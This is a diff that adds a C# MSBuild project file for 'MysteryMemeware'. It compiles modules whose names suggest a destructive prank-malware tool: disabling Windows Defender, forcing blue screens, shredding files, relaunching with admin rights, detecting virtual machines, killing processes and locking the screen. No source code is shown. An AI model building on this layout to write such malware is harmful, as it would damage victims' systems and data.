@@ -1,0 +1,112 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{C21C7063-96CD-4011-907A-A7B08AC03B50}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>MysteryMemeware</RootNamespace>
+    <AssemblyName>MysteryMemeware</AssemblyName>
+    <TargetFrameworkVersion>v4.8.1</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>MysteryMemeware.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>MysteryAssets\Icon.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup />
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.DirectoryServices" />
+    <Reference Include="System.DirectoryServices.AccountManagement" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="MysteryExperienceHost\CursorControlModule.cs" />
+    <Compile Include="MysteryExperienceHost\InputSpamModule.cs" />
+    <Compile Include="MysteryExperienceHost\MusicModule.cs" />
+    <Compile Include="MysteryExperienceHost\ProcessExterminatorModule.cs" />
+    <Compile Include="MysteryExperienceHost\Program.cs" />
+    <Compile Include="MysteryExperienceHost\ScreenCoverForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MysteryExperienceHost\ScreenCoverModule.cs" />
+    <Compile Include="MysteryExperienceHost\VolumeModule.cs" />
+    <Compile Include="MysteryHelpers\AESHelper.cs" />
+    <Compile Include="MysteryHelpers\ArrayHelper.cs" />
+    <Compile Include="MysteryHelpers\BSODHelper.cs" />
+    <Compile Include="MysteryHelpers\ConsoleHelper.cs" />
+    <Compile Include="MysteryHelpers\CPUHelper.cs" />
+    <Compile Include="MysteryHelpers\PathHelper.cs" />
+    <Compile Include="MysteryHelpers\ProcessHelper.cs" />
+    <Compile Include="MysteryHelpers\RandomnessHelper.cs" />
+    <Compile Include="MysteryHelpers\RegistryHelper.cs" />
+    <Compile Include="MysteryHelpers\SHA256Helper.cs" />
+    <Compile Include="MysteryHelpers\ShreddingHelper.cs" />
+    <Compile Include="MysteryHelpers\StringEncodingHelper.cs" />
+    <Compile Include="MysteryHelpers\StringHelper.cs" />
+    <Compile Include="MysteryHelpers\ThreadingHelper.cs" />
+    <Compile Include="MysteryHelpers\TryHelper.cs" />
+    <Compile Include="MysteryHelpers\UACHelper.cs" />
+    <Compile Include="MysteryHelpers\UserHelper.cs" />
+    <Compile Include="MysteryHelpers\VolumeHelper.cs" />
+    <Compile Include="MysteryHelpers\Win32HandleHelper.cs" />
+    <Compile Include="MysteryHelpers\Win32InputHelper.cs" />
+    <Compile Include="MysterySupervisor\AdminRelaunch.cs" />
+    <Compile Include="MysterySupervisor\DefendNuker.cs" />
+    <Compile Include="MysterySupervisor\FileSystemInforcement.cs" />
+    <Compile Include="MysterySupervisor\Program.cs" />
+    <Compile Include="MysterySupervisor\RegistryInforcement.cs" />
+    <Compile Include="MysterySupervisor\UserInforcement.cs" />
+    <Compile Include="MysterySupervisor\VMCheck.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+    <None Include="MysterySupervisor\App.config" />
+    <None Include="ReadMe.md" />
+  </ItemGroup>
+  <ItemGroup>
+    <Folder Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include=".gitignore" />
+    <Content Include="MysteryAssets\CoverImage.bmp" />
+    <Content Include="MysteryAssets\Icon.ico" />
+    <Content Include="MysteryAssets\Icon.png" />
+    <Content Include="MysteryAssets\Song.wav" />
+    <Content Include="MysteryExperienceHost\CoverImage.bmp" />
+    <Content Include="MysteryExperienceHost\Icon.ico" />
+    <Content Include="MysteryExperienceHost\Song.wav" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
